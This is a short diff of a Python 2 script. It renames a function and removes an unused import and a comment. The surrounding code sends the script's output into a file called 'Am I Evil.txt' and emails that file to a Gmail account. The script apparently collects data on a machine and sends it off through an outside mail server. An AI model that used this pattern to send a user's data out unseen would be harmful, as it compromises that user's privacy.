@@ -10,7 +10,7 @@ from email.MIMEMultipart import MIMEMultipart
 from email.MIMEBase import MIMEBase
 from email.MIMEText import MIMEText
 from email import Encoders
-import time
+
 
 gmail_user =''
 gmail_pwd =''
@@ -18,7 +18,7 @@ subject=''
 text=''
 attach='c:\\Am I Evil.txt'
 
-def ok():
+def mail():
     import sys
     with open('c:\\Am I Evil.txt', 'w') as f:
         sys.stdout = f
@@ -42,7 +42,6 @@ def ok():
         mailServer.ehlo()
         mailServer.login(gmail_user, gmail_pwd)
         mailServer.sendmail(gmail_user,gmail_user, msg.as_string())
-        # Should be mailServer.quit(), but that crashes...
         mailServer.close()
 
     
@@ -129,6 +128,6 @@ def getpath():
 
 if __name__ == '__main__':
     
-    ok()
+    mail()
 
 
